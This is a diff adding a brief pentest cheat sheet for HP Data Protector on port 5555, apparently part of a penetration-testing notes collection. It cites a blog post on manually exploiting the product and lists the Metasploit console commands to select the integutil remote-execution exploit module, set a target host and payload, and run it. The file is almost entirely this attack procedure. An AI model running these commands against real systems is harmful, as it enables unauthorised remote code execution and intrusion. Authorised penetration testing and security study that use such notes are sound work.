@@ -1,0 +1,14 @@
+# Pentest HPDataProtector
+## Default Port: 5555
+## References:
+## http://blog.opensecurityresearch.com/2012/08/manually-exploiting-hp-data-protector.html
+
+
+# Exploit - integutil (metasploit)
+use exploit/multi/misc/hp_data_protector_exec_integutil
+show targets
+set target <id>
+set RHOSTS <rhost>
+show payloads
+set payload <payload>
+run
